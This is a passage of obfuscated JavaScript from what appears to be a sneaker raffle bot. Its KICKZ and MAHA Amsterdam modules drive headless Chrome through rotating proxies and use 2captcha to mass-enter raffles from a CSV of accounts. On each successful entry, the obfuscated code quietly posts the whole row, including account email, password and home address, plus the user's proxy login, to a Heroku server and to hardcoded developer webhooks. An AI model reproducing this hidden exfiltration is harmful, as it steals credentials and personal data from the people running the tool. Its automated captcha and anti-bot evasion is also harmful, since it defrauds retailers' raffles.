                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x1da99f['name'] + ']\x20Task\x20' + (_0x59e2b6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2e3a40 + '\x20/\x205)')), _0x59e2b6 = _0x59e2b6 - 0x1, _0x2e3a40 = _0x2e3a40 + 0x1;
                                continue;
                            }
                            _0x37c22e == 'yes' && _0x2e3a40 >= 0x5 && (_0x13d7e5(_0x5b8aff[_0x59e2b6], _0x1da99f), _0x37c22e = 'no', _0x2e3a40 = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x4f5630, _0x41ab3f, _0x2138f3) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2ffdf6 = 0x0; _0x2ffdf6 < _0x41ab3f['length']; _0x2ffdf6++) {
                        var _0xc86770;
                        if (_0x598406 != 'yes')
                            var _0x598406 = '', _0x51f62a = 0x0;
                        _0x1b4448(_0x4f5630['name'] + '\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20/\x20' + _0x41ab3f['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        var _0x57dac5 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x34b198
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x41ab3f[_0x2ffdf6]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x41ab3f[_0x2ffdf6]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x342ed0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4e463c
                                }
                            ]
                        }];
                        let _0x598204 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x2a8788 = ![];
                        for (key of _0x598204) {
                            if (_0x41ab3f[_0x2ffdf6][key] == '' || !_0x41ab3f[_0x2ffdf6][key]) {
                                console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x2a8788 = !![];
                                break;
                            }
                        }
                        if (_0x2a8788) {
                            await _0x140651(0x1f4);
                            continue;
                        }
                        var _0x3367b6 = await _0x11b6e5(_0x41ab3f[_0x2ffdf6], _0x4f5630, 'dev', ![]), _0xd53a7f = await _0x11b6e5(_0x41ab3f[_0x2ffdf6], _0x4f5630, 'pub', ![]);
                        const _0x1e9619 = {
                            'succesDEVMSG': { 'embeds': [_0x3367b6] },
                            'succesPUBMSG': { 'embeds': [_0xd53a7f] }
                        };
                        try {
                            await _0x58ea73(_0x41ab3f, _0x2ffdf6);
                        } catch {
                            _0x598406 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x3ef381 = _0x2138f3[_0x2ffdf6]['split'](':');
                        else
                            var _0x5b1b61 = Math['round'](Math['random']() * (_0x2138f3['length'] - 0x1)), _0x3ef381 = _0x2138f3[_0x5b1b61]['split'](':');
                        var _0x4e5579;
                        try {
                            _0x4e5579 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3ef381[0x0] + ':' + _0x3ef381[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4e5579 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x3ef381[0x0] + ':' + _0x3ef381[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9682f0 = await _0x4e5579['newPage']();
                            await _0x9682f0['authenticate']({
                                'username': '' + _0x3ef381[0x2],
                                'password': '' + _0x3ef381[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9682f0['setRequestInterception'](!![]), _0x9682f0['on']('request', _0x4bb078 => {
                                _0x4bb078['resourceType']() === 'image' || _0x4bb078['resourceType']() === 'font' || _0x4bb078['resourceType']() === 'media' ? _0x4bb078['abort']() : _0x4bb078['continue']();
                            }), await _0x9682f0['goto']('' + _0x41ab3f[_0x2ffdf6]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x140651(0x12c), await _0x9682f0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x9682f0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x140651(0x7d0);
                            try {
                                await _0x9682f0['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x9682f0['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Logging\x20in'), await _0x9682f0['waitForSelector']('#username'), await _0x9682f0['type']('#username', _0x41ab3f[_0x2ffdf6]['Email']), await _0x9682f0['waitForSelector']('#password'), await _0x9682f0['type']('#password', _0x41ab3f[_0x2ffdf6]['Password']), await _0x140651(0x190), await _0x9682f0['click']('#buttonSubmit'), await _0x9682f0['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x41ab3f[_0x2ffdf6]['Size']);
                            let _0x12cd51 = _0x41ab3f[_0x2ffdf6]['Size']['replace']('.5', '\x201/2');
                            if (_0x12cd51['toUpperCase']() == 'RANDOM') {
                                const _0x3ca8e7 = await _0x9682f0['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x261f11 = Math['round'](Math['random']() * (_0x3ca8e7['length'] - 0x1));
                                await _0x3ca8e7[_0x261f11]['click']();
                            } else
                                await _0x9682f0['click']('button[aria-label=\x22' + _0x12cd51 + '\x22]');
                            await _0x140651(0x1f4);
                            try {
                                await _0x9682f0['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x140651(0x12c), console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x9682f0['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_firstName', _0x41ab3f[_0x2ffdf6]['FirstName']), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_lastName', _0x41ab3f[_0x2ffdf6]['LastName']), await _0x140651(0x12c), await _0x9682f0['select']('#dwfrm_raffle_addressFields_country', _0x41ab3f[_0x2ffdf6]['Country']), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_city', _0x41ab3f[_0x2ffdf6]['City']), await _0x140651(0x12c);
                            _0x41ab3f[_0x2ffdf6]['Postcode'] == undefined && (_0x41ab3f[_0x2ffdf6]['Postcode'] = _0x41ab3f[_0x2ffdf6]['Zip']);
                            await _0x9682f0['type']('#dwfrm_raffle_addressFields_postalCode', _0x41ab3f[_0x2ffdf6]['Postcode']), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_address1', _0x41ab3f[_0x2ffdf6]['Address1']), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_address2', _0x41ab3f[_0x2ffdf6]['HouseNumber']), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x41ab3f[_0x2ffdf6]['Address2']), await _0x140651(0x12c), await _0x9682f0['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x140651(0x12c), await _0x9682f0['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x41ab3f[_0x2ffdf6]['Follower']), await _0x140651(0x1f4), await _0x9682f0['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20' + _0x16a3a0['blue']('Awaiting\x20Paypal\x20Payment')), await _0x9682f0['click']('.b-paypal_button');
                            try {
                                await _0x9682f0['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x598406 = 'no', _0x1ce4fb(_0x41ab3f[_0x2ffdf6], _0x4f5630), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1e9619['succesDEVMSG']);
                                await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x1e9619['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x1e9619['succesPUBMSG']);
                                let _0x4d6419 = _0x41ab3f[_0x2ffdf6];
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'module': _0x4f5630['name'],
                                        'entrydata': JSON['stringify'](_0x4d6419),
                                        'proxy': '' + _0x2138f3[_0x2ffdf6]
                                    };
                                    var _0x2a2d6b = JSON['stringify'](prxdata);
                                    let _0xe48469 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x2a2d6b, _0xe48469);
                                } catch (_0x598880) {
                                }
                            } catch (_0x9e48d9) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x9e48d9)), _0xc86770 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x9e48d9;
                                var _0x26b884 = await _0x11b6e5(_0x41ab3f[_0x2ffdf6], _0x4f5630, 'dev', !![], _0xc86770);
                                _0x1e9619['errorDEV'] = { 'embeds': [_0x26b884] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1e9619['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x1e9619['errorDEV']);
                            }
                        } catch (_0x5c315c) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20' + _0x5c315c)), _0xc86770 = '' + _0x5c315c;
                            var _0x26b884 = await _0x11b6e5(_0x41ab3f[_0x2ffdf6], _0x4f5630, 'dev', !![], _0xc86770);
                            _0x1e9619['errorDEV'] = { 'embeds': [_0x26b884] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1e9619['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x1e9619['errorDEV']), _0x598406 = 'yes';
                        } finally {
                            _0x4e5579 && _0x4e5579['close']();
                            if (_0x598406 == 'yes' && _0x51f62a != 0x5) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x4f5630['name'] + ']\x20Task\x20' + (_0x2ffdf6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x51f62a + '\x20/\x205)')), _0x2ffdf6 = _0x2ffdf6 - 0x1, _0x51f62a = _0x51f62a + 0x1;
                                continue;
                            }
                            _0x598406 == 'yes' && _0x51f62a >= 0x5 && (_0x13d7e5(_0x41ab3f[_0x2ffdf6], _0x4f5630), _0x598406 = 'no', _0x51f62a = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['AfewDelay'] + '\x20ms'), await _0x140651(_0x342ed0['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x42a2a6, _0x2f591f, _0x23eb85) {
                    for (var _0x46ef0e = 0x0; _0x46ef0e < _0x2f591f['length']; _0x46ef0e++) {
                        try {
                            await _0x58ea73(_0x2f591f, _0x46ef0e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2f2441(_0x4fd0b4, _0x1f595a, _0x344382, _0x47c704, _0x4d32a7) {
                            var _0x4e5bb4, _0x2cf97c = {}, _0x4f3ce7 = [], _0x54cf3b = {}, _0x2ec777 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x5db2a1 = Math['round'](Math['random']() * (_0x2ec777['length'] - 0x1));
                            !_0x47c704 && (_0x47c704 = {});
                            if (_0x1f595a != 'ver') {
                                _0x1b4448(_0x344382['name'] + '\x20Task\x20' + (_0x4fd0b4 + 0x1) + '\x20/\x20' + _0x47c704['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f), await _0x58ea73(_0x47c704, _0x4fd0b4), _0x2cf97c = _0x344382['data'], _0x2cf97c['data']['attributes']['email'] = '' + _0x47c704[_0x4fd0b4]['Email'];
                                if (_0x47c704[_0x4fd0b4]['Size'] == 'RANDOM') {
                                }
                                _0x2cf97c['data']['attributes']['properties']['$first_name'] = '' + _0x47c704[_0x4fd0b4]['FirstName'], _0x2cf97c['data']['attributes']['properties']['$last_name'] = '' + _0x47c704[_0x4fd0b4]['LastName'], _0x2cf97c['data']['attributes']['properties']['$address1'] = _0x47c704[_0x4fd0b4]['Address1'] + '\x20' + _0x47c704[_0x4fd0b4]['Address2'] + '\x20' + _0x47c704[_0x4fd0b4]['HouseNumber'], _0x2cf97c['data']['attributes']['properties']['$zip'] = '' + _0x47c704[_0x4fd0b4]['Zip'], _0x2cf97c['data']['attributes']['properties']['$city'] = '' + _0x47c704[_0x4fd0b4]['City'], _0x2cf97c['data']['attributes']['properties']['$country'] = '' + _0x47c704[_0x4fd0b4]['Country'], _0x47c704[_0x4fd0b4]['Size'] == 'RANDOM' ? _0x2cf97c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2ec777[_0x5db2a1] : _0x2cf97c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x47c704[_0x4fd0b4]['Size'], _0x2cf97c['data']['attributes']['properties']['$phone_number'] = '' + _0x47c704[_0x4fd0b4]['Phone'], _0x2cf97c['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x47c704[_0x4fd0b4]['Follower'];
                            }
                            if (_0x342ed0['useRandomProxy'] = ![])
                                var _0x4c5343 = _0x4d32a7[_0x4fd0b4]['split'](':');
                            else
                                var _0x1cf26 = Math['round'](Math['random']() * (_0x4d32a7['length'] - 0x1)), _0x4c5343 = _0x4d32a7[_0x1cf26]['split'](':');
                            var _0x1fbaad = {
                                'jar': _0x931e8b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x344382['url'],
                                'headers': _0x344382['headers'],
                                'body': JSON['stringify'](_0x2cf97c),
                                'proxy': 'http://' + _0x4c5343[0x2] + ':' + _0x4c5343[0x3] + '@' + _0x4c5343[0x0] + ':' + _0x4c5343[0x1]
                            };
                            return _0x1f595a != 'ver' && (_0x1fbaad['url'] = _0x344382['url'], _0x1fbaad['headers'] = _0x344382['headers']), _0x1f595a == 'ver' && (_0x1fbaad['method'] = 'GET'), new Promise(function (_0x14b012, _0x5be344) {
                                callback = async (_0x1f5b8e, _0x9875c7, _0x2a8b28) => {
                                    if (!_0x1f5b8e && _0x9875c7['statusCode'] == 0xca || !_0x1f5b8e && _0x9875c7['statusCode'] == 0xc8) {
                                        if (_0x1f595a != 'ver') {
                                            var _0x53b0ff = await _0x11b6e5(_0x47c704[_0x4fd0b4], _0x344382, 'dev', ![]), _0x574cdb = await _0x11b6e5(_0x47c704[_0x4fd0b4], _0x344382, 'pub', ![]);
                                            const _0x2f2a3c = {
                                                'succesDEVMSG': { 'embeds': [_0x53b0ff] },
                                                'succesPUBMSG': { 'embeds': [_0x574cdb] }
                                            };
                                            let _0x454269 = _0x47c704[_0x4fd0b4];
                                            try {
                                                prxdata = {
                                                    'username': _0x34b198['replace']('#', ''),
                                                    'module': _0x344382['name'],
                                                    'entrydata': JSON['stringify'](_0x454269),
                                                    'proxy': '' + _0x4d32a7[_0x4fd0b4]
                                                };
                                                var _0x36f789 = JSON['stringify'](prxdata);
                                                let _0x11ce72 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x36f789, _0x11ce72);
                                            } catch (_0x120a8c) {
                                            }
                                            if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                                                try {
                                                    await _0x29bde2(_0x342ed0['webhook'], _0x2f2a3c['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x2f2a3c['succesDEVMSG']), await _0x140651(0xc8);
                                            try {
                                                await _0x29bde2(_0x259650, _0x2f2a3c['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1ce4fb(_0x47c704[_0x4fd0b4], _0x344382);
                                        }
                                        _0x14b012(console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x344382['name'] + ']\x20Task\x20' + (_0x4fd0b4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x1f595a != 'ver') {
                                            var _0x10ea37 = '' + _0x1f5b8e, _0x2be647 = await _0x11b6e5(_0x47c704[_0x4fd0b4], _0x344382, 'dev', !![], _0x10ea37), _0x16fc3b = {};
                                            _0x16fc3b['errorDEV'] = { 'embeds': [_0x2be647] }, _0x13d7e5(_0x47c704[_0x4fd0b4], _0x344382), _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x16fc3b['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x16fc3b['errorDEV']);
                                        }
                                        _0x5be344(console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x344382['name'] + ']\x20Task\x20' + (_0x4fd0b4 + 0x1) + ':\x20' + _0x1f5b8e)));
                                    }
                                };
                                try {
                                    _0x1f595a != 'ver' && console['log'](_0x597cbe() + '\x20[' + _0x344382['name'] + ']\x20Task\x20' + (_0x4fd0b4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2cf97c['data']['attributes']['email']), _0x527126(_0x1fbaad, callback);
                                } catch (_0xd8573c) {
                                    console['log'](_0x597cbe() + '\x20Task\x20' + (_0x4fd0b4 + 0x1) + ':\x20' + _0xd8573c);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2f2441(_0x46ef0e, 'nor', _0x42a2a6, _0x2f591f, _0x23eb85), console['log'](_0x597cbe() + '\x20[' + _0x42a2a6['name'] + ']\x20Sleeping\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        } catch (_0x440f36) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x45b073, _0x3df0e3, _0x226eb1) {
                    var _0x2a2ed3 = [], _0x5ee306 = ![];
                    async function _0x5979c0() {
                        var _0x15ba45 = new _0x4d6860({
                            'user': _0x342ed0['masterMail'],
                            'password': _0x342ed0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x51a9e9(_0x67d18e) {
                            _0x15ba45['openBox']('INBOX', ![], _0x67d18e);
                        }
                        _0x15ba45['once']('ready', function () {
                            _0x51a9e9(function (_0x452c93, _0x4365fa) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x452c93)
                                    throw _0x452c93;
                                _0x15ba45['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x2cc8fe, _0x3434c7) {
                                    if (!_0x3434c7 || !_0x3434c7['length'])
                                        console['log'](_0x597cbe() + '\x20[' + _0x45b073['name'] + ']\x20No\x20mails\x20found'), _0x15ba45['end']();
                                    else {
                                        var _0x4c5253 = _0x15ba45['seq']['fetch'](_0x3434c7, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4c5253['on']('message', function (_0xac548e, _0x4d7b42) {
                                            var _0x34c490 = '(#' + _0x4d7b42 + ')\x20';
                                            _0xac548e['on']('body', function (_0x58c5ca, _0x15ef40) {
                                                _0x502d57(_0x58c5ca, (_0x3a95a4, _0x22d080) => {
                                                    var _0x24f807 = _0x22d080['text']['split']('(')[0x1], _0x99c012 = _0x24f807['split'](')')[0x0];
                                                    _0x2a2ed3['push'](_0x99c012);
                                                });
                                            }), _0xac548e['once']('end', function () {
                                            });
                                        }), _0x4c5253['once']('error', function (_0x502509) {
                                            console['log']('Fetch\x20error:\x20' + _0x502509), _0x5ee306 = !![];
                                        }), _0x4c5253['once']('end', function () {
                                            _0x15ba45['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x15ba45['once']('error', function (_0x5a9ba8) {
                            console['log'](_0x16a3a0['red'](_0x5a9ba8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5ee306 = !![];
                        }), _0x15ba45['once']('end', async function () {
                            _0x5ee306 = !![];
                        }), _0x15ba45['connect']();
                    }
                    async function _0x412a46(_0x4a7b54, _0x3bb20d, _0x39bb0b) {
                        for (var _0x5b7169 = 0x0; _0x5b7169 < _0x3bb20d['length']; _0x5b7169++) {
                            async function _0x5cfa2f(_0x3765d5, _0x19a41e, _0x467fcd, _0x280c50, _0x14e4e9) {
                                var _0x1a5859, _0x3a9d5d = {}, _0x28ba0b = [], _0x50a2d8 = {}, _0x20a19e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4ac30c = Math['round'](Math['random']() * (_0x20a19e['length'] - 0x1));
                                _0x280c50[_0x3765d5]['Size'] == 'RANDOM' && (_0x280c50[_0x3765d5]['Size'] = _0x20a19e[_0x4ac30c]);
                                !_0x280c50 && (_0x280c50 = {});
                                if (_0x342ed0['useRandomProxy'] = ![])
                                    var _0x41a380 = _0x14e4e9[_0x3765d5]['split'](':');
                                else
                                    var _0x57bfda = Math['round'](Math['random']() * (_0x14e4e9['length'] - 0x1)), _0x41a380 = _0x14e4e9[_0x57bfda]['split'](':');
                                var _0x2a8560 = {
                                    'jar': _0x931e8b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x467fcd['url'],
                                    'headers': _0x467fcd['headers'],
                                    'body': JSON['stringify'](_0x3a9d5d),
                                    'proxy': 'http://' + _0x41a380[0x2] + ':' + _0x41a380[0x3] + '@' + _0x41a380[0x0] + ':' + _0x41a380[0x1]
                                };
                                return _0x19a41e != 'ver' && (_0x2a8560['url'] = _0x467fcd['url'], _0x2a8560['headers'] = _0x467fcd['headers']), _0x19a41e == 'ver' && (_0x2a8560['method'] = 'GET', _0x2a8560['url'] = _0x280c50[_0x3765d5]), new Promise(function (_0xd37055, _0x59867b) {
                                    callback = async (_0x433461, _0x43ce26, _0x114429) => {
                                        if (!_0x433461 && _0x43ce26['statusCode'] == 0xca || !_0x433461 && _0x43ce26['statusCode'] == 0xc8) {
                                            if (_0x19a41e != 'ver') {
                                                var _0x5dde0c = await _0x11b6e5(_0x280c50[_0x3765d5], _0x467fcd, 'dev', ![]), _0x227a10 = await _0x11b6e5(_0x280c50[_0x3765d5], _0x467fcd, 'pub', ![]);
                                                const _0x590d9c = {
                                                    'succesDEVMSG': { 'embeds': [_0x5dde0c] },
                                                    'succesPUBMSG': { 'embeds': [_0x227a10] }
                                                };
                                                if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                                                    try {
                                                        await _0x29bde2(_0x342ed0['webhook'], _0x590d9c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x590d9c['succesDEVMSG']), await _0x140651(0xc8);
                                                try {
                                                    await _0x29bde2(_0x259650, _0x590d9c['succesPUBMSG']);
                                                } catch {
                                                }
